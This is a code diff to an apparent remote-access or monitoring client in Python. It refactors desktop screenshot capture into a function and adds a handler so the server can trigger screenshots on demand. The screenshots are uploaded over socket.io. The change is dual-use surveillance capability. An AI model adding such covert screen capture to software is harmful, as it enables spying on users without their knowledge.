@@ -78,38 +78,64 @@ def grab_screen() -> Optional[Image.Image]:
         return None
 
 
+def take_and_upload_screenshot(req_id: Optional[str] = None) -> Optional[str]:
+    """Capture desktop screenshot, resize/convert, and upload to server."""
+    try:
+        timestamp = (
+            time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
+        )
+        filename = f"{timestamp}.jpg"
+
+        img = grab_screen()
+        if img is None:
+            if req_id and sio.connected:
+                sio.emit(
+                    "capture_screenshot_res",
+                    {"req_id": req_id, "error": "Failed to grab screen"},
+                )
+            return None
+
+        w, h = img.size
+        img_resized = img.resize(
+            (w // 2, h // 2), Image.Resampling.BILINEAR
+        ).convert("L")
+
+        buf = io.BytesIO()
+        img_resized.save(buf, format="JPEG", quality=80)
+        img_bytes = buf.getvalue()
+
+        if sio.connected:
+            sio.emit(
+                "upload_frame",
+                {"username": unique_user, "filename": filename, "image": img_bytes},
+            )
+            if req_id:
+                sio.emit(
+                    "capture_screenshot_res",
+                    {
+                        "req_id": req_id,
+                        "success": True,
+                        "filename": filename,
+                        "width": w,
+                        "height": h,
+                    },
+                )
+            return filename
+    except Exception as e:
+        if req_id and sio.connected:
+            try:
+                sio.emit("capture_screenshot_res", {"req_id": req_id, "error": str(e)})
+            except Exception:
+                pass
+    return None
+
+
 def capture_loop():
     """Continuous screen frame capture stream."""
     global capture_active
 
     while capture_active:
-        try:
-            timestamp = (
-                time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
-            )
-            filename = f"{timestamp}.jpg"
-
-            img = grab_screen()
-            if img is None:
-                time.sleep(1)
-                continue
-
-            w, h = img.size
-            img_resized = img.resize(
-                (w // 2, h // 2), Image.Resampling.BILINEAR
-            ).convert("L")
-
-            buf = io.BytesIO()
-            img_resized.save(buf, format="JPEG", quality=80)
-            img_bytes = buf.getvalue()
-
-            if sio.connected:
-                sio.emit(
-                    "upload_frame",
-                    {"username": unique_user, "filename": filename, "image": img_bytes},
-                )
-        except Exception:
-            pass
+        take_and_upload_screenshot()
         time.sleep(1)
 
 
@@ -186,6 +212,12 @@ def on_set_capture(data):
         capture_thread.start()
     elif not should_capture and capture_active:
         capture_active = False
+
+
+@sio.on("take_screenshot")
+def on_take_screenshot(data=None):
+    req_id = data.get("req_id") if isinstance(data, dict) else None
+    threading.Thread(target=take_and_upload_screenshot, args=(req_id,), daemon=True).start()
 
 
 # ── File System / FTP Browser Handlers ──
